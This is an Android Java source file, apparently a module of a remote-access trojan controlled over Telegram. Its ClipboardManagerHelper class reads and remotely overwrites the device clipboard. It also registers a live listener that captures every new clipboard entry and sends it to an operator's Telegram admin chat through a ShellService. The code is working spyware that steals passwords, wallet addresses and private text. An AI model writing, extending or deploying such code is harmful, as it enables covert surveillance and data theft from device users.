package com.java.panel;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;

public class ClipboardManagerHelper {

    private static boolean isListening = false;

    public static String getClipboardText(Context context) {
        try {
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null && clipboard.hasPrimaryClip() && clipboard.getPrimaryClip().getItemCount() > 0) {
                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                CharSequence text = item != null ? item.getText() : null;
                return text != null && !text.toString().isEmpty() 
                        ? "📋 **Clipboard Content:**\n`" + text.toString() + "`" 
                        : "📋 Clipboard is empty.";
            }
        } catch (Exception e) {
            return "❌ Clipboard reading error: " + e.getMessage();
        }
        return "📋 Clipboard is empty.";
    }

    public static String setClipboardText(Context context, String text) {
        try {
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null) {
                ClipData clip = ClipData.newPlainText("remote_text", text);
                clipboard.setPrimaryClip(clip);
                return "✅ **Clipboard Updated:**\n`" + text + "`";
            }
        } catch (Exception e) {
            return "❌ Clipboard writing error: " + e.getMessage();
        }
        return "❌ Error: Clipboard service could not be accessed.";
    }

    public static void startLiveListener(Context context, ShellService shellService) {
        if (isListening) return;
        try {
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null) {
                clipboard.addPrimaryClipChangedListener(() -> {
                    try {
                        if (clipboard.hasPrimaryClip() && clipboard.getPrimaryClip().getItemCount() > 0) {
                            ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                            CharSequence text = item != null ? item.getText() : null;
                            if (text != null && !text.toString().isEmpty()) {
                                String msg = "📋 **Live Clipboard Captured:**\n`" + text.toString() + "`";
                                if (shellService != null && !shellService.ADMIN_CHAT_ID.isEmpty()) {
                                    shellService.sendTelegramMessage(shellService.ADMIN_CHAT_ID, msg);
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                });
                isListening = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
